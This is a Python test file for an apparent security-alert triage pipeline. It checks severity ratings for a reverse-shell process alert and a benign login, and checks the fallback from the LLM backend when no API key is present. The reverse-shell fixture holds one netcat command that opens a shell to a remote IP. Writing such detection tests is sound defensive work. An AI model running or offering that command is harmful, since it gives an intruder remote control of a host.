from triagen_core.alert_processor import process_alert
from triagen_core.enrichment_engine import enrich_alert
from triagen_core.reasoning_engine import triage

REVERSE_SHELL_ALERT = {
    "alert_type": "process_start",
    "timestamp": "2026-07-14T02:13:00Z",
    "user": "svc_web",
    "hostname": "prod-web01",
    "details": {"command": "nc -e /bin/sh 10.0.0.5 4444"},
}

BENIGN_LOGIN_ALERT = {
    "alert_type": "auth_login",
    "timestamp": "2026-07-14T10:05:00Z",
    "user": "jsmith",
    "hostname": "corp-laptop-042",
    "details": {"command": "office365 sso login"},
}


def _pipeline(alert):
    return enrich_alert(process_alert(alert))


def test_triage_flags_reverse_shell_as_high_severity():
    result = triage(_pipeline(REVERSE_SHELL_ALERT))
    assert result["severity"] in ("high", "critical")
    assert result["verdict"] == "likely malicious"
    assert result["recommended_action"] == "kill_process"
    assert result["attack_technique"] is not None
    assert result["backend"] == "deterministic"
    assert result["prompt_injection_indicators"] == []


def test_triage_marks_benign_login_as_low_severity():
    result = triage(_pipeline(BENIGN_LOGIN_ALERT))
    assert result["severity"] == "low"
    assert result["verdict"] == "likely benign"
    assert result["recommended_action"] == "mark_false_positive"


def test_triage_never_uses_llm_backend_without_api_key(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    result = triage(_pipeline(REVERSE_SHELL_ALERT), use_llm=True)
    assert result["backend"] == "deterministic"
